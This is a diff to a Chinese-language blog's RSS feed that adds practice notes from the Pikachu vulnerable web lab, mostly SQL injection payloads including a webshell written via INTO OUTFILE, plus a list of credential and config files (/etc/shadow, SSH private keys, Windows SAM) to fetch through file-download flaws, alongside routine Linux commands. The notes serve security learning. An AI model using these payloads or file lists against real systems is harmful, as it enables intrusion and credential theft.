@@ -10,8 +10,79 @@
         </author>
         <description></description>
         <language>zh-CN</language>
-        <pubDate>Sat, 23 Jul 2022 11:45:16 +0800</pubDate>
-        <lastBuildDate>Sat, 23 Jul 2022 11:45:16 +0800</lastBuildDate>
+        <pubDate>Tue, 20 Sep 2022 20:21:49 +0800</pubDate>
+        <lastBuildDate>Tue, 20 Sep 2022 20:21:49 +0800</lastBuildDate>
+        <item>
+            <guid isPermalink="true">http://ericcd.com/2022/09/20/pikachu/</guid>
+            <title>pikachu</title>
+            <link>http://ericcd.com/2022/09/20/pikachu/</link>
+            <category term="web" scheme="http://ericcd.com/categories/web/" />
+            <category term="web" scheme="http://ericcd.com/tags/web/" />
+            <pubDate>Tue, 20 Sep 2022 20:21:49 +0800</pubDate>
+            <description><![CDATA[ &lt;p&gt;记录一些在使用 pikahcu 练习时用到的命令。&lt;br /&gt;
+&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;h1 id=&#34;sql-注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sql-注入&#34;&gt;#&lt;/a&gt; SQL 注入&lt;/h1&gt;
+&lt;ol&gt;
+&lt;li&gt;获取数据库名&lt;br /&gt;
+ &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;# union select database ()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;li&gt;获取表名&lt;br /&gt;
+ &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;# union select group_concat (table_name) from information_schema.tables where table_schema=database ()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;li&gt;获取列名&lt;br /&gt;
+ &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;# union select group_concat (table_name) from information_schema.columns where table_name=&amp;#x27; 表名 &amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;li&gt;读文件&lt;br /&gt;
+ &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;# union select load_file (&amp;#x27;Path&amp;#x27;) from 表名 &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;li&gt;写文件&lt;br /&gt;
+ &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;# union select &amp;#x27;&amp;lt;!php assert ($_POST [1];?)&amp;gt;&amp;#x27; into outfile &amp;#x27;Path&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;li&gt;报错回显&lt;br /&gt;
+ &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;# and updatexml (1,concat (0x7e,(select database ()),0x7e),1))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;/ol&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">http://ericcd.com/2022/08/31/linux-command/</guid>
+            <title>linux-command</title>
+            <link>http://ericcd.com/2022/08/31/linux-command/</link>
+            <category term="linux" scheme="http://ericcd.com/categories/linux/" />
+            <category term="linux" scheme="http://ericcd.com/tags/linux/" />
+            <pubDate>Wed, 31 Aug 2022 15:02:26 +0800</pubDate>
+            <description><![CDATA[ &lt;p&gt;记录一些 linux 环境下会用到的命令。&lt;br /&gt;
+&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;设置代理。&lt;br /&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;# export http_proxy=&amp;#x27;http://windows 的 ip: 代理端口 &amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# curl -vv google.com&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# git config --global https.proxy http://windows 的 ip: 代理端口 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# git config --global https.proxy https://windows 的 ip: 代理端口 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# git config --global http.proxy &amp;#x27;socks5://windows 的 ip: 代理端口 &amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# git config --global https.proxy &amp;#x27;socks5://windows 的 ip: 代理端口 &amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;批量添加后缀名。&lt;br /&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;# find . -type f | awk -F &amp;quot;.&amp;quot; &amp;#x27;&amp;#123;print $2&amp;#125;&amp;#x27; | xargs -i -t mv ./&amp;#123;&amp;#125; ./&amp;#123;&amp;#125;.apk&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;查看 python 版本。&lt;br /&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#  ls /usr/bin/python*&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;添加 python 版本。&lt;br /&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#  sudo update-alternatives --install /usr/bin/python python /usr/bin/python3.6 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;查看和更换 python 版本。&lt;br /&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#  update-alternatives --config python&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">http://ericcd.com/2022/08/20/file-download/</guid>
+            <title>文件包含漏洞可以尝试下载的文件</title>
+            <link>http://ericcd.com/2022/08/20/file-download/</link>
+            <category term="web" scheme="http://ericcd.com/categories/web/" />
+            <category term="web" scheme="http://ericcd.com/tags/web/" />
+            <pubDate>Sat, 20 Aug 2022 16:20:20 +0800</pubDate>
+            <description><![CDATA[ &lt;p&gt;记录一些利用文件下载漏洞下载的目标文件。&lt;br /&gt;
+&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;br /&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#    Windows&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#    C:\boot.ini// 查看系统版本 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#    C:\Windows\System32\inetsrv\MetaBase.xml//IIS 配置文件 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#    C:\Windows\repair\sam // 存储系统初次安装的密码 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#    C:\Program Files\mysql\my.ini//Mysql 配置 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#    C:\Program Files\mysql\data\mysql\user.MYD//Mysql root&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#    C:\Windows\php.ini//php 配置信息 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#    C:\Windows\my.ini//Mysql 配置信息 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#    C:\Windows\win.ini//Windows 系统的一个基本系统配置文件 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#   &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#    Linux&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#    /root/.ssh/authorized_keys&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#    /root/.ssh/id_rsa&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#    /root/.ssh/id_ras.keystore&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#    /root/.ssh/known_hosts// 记录每个访问计算机用户的公钥 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#    /etc/passwd&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#    /etc/shadow&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#    /usr/local/app/php5/lib/php.ini//PHP 配置文件 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#    /etc/my.cnf//mysql 配置文件 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#    /etc/httpd/conf/httpd.conf//apache 配置文件 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#    /root/.bash_history// 用户历史命令记录文件 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#    /root/.mysql_history//mysql 历史命令记录文件 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#    /proc/mounts// 记录系统挂载设备 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#    /porc/config.gz// 内核配置文件 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#    /var/lib/mlocate/mlocate.db// 全文件路径 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#    /porc/self/cmdline// 当前进程的 cmdline 参数 &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+ ]]></description>
+        </item>
         <item>
             <guid isPermalink="true">http://ericcd.com/2022/07/23/vulhub-command/</guid>
             <title>vulhub 相关命令</title>
@@ -262,10 +333,10 @@ Context Manager 还提供用于 Android 内的各种系统服务信息。应用�
             <category term="Android逆向实践" scheme="http://ericcd.com/categories/Android%E9%80%86%E5%90%91%E5%AE%9E%E8%B7%B5/" />
             <category term="ddms" scheme="http://ericcd.com/tags/ddms/" />
             <category term="Android逆向" scheme="http://ericcd.com/tags/Android%E9%80%86%E5%90%91/" />
+            <category term="Android Studio" scheme="http://ericcd.com/tags/Android-Studio/" />
             <category term="apktool" scheme="http://ericcd.com/tags/apktool/" />
             <category term="jarsign" scheme="http://ericcd.com/tags/jarsign/" />
             <category term="010Editor" scheme="http://ericcd.com/tags/010Editor/" />
-            <category term="Android Studio" scheme="http://ericcd.com/tags/Android-Studio/" />
             <pubDate>Tue, 01 Mar 2022 21:09:53 +0800</pubDate>
             <description><![CDATA[ &lt;p&gt;在网上看见通过修改 Androidmanifest 来识别 apk 是否被重打包的方法，进行一次实践进行验证。&lt;br /&gt;
 &lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
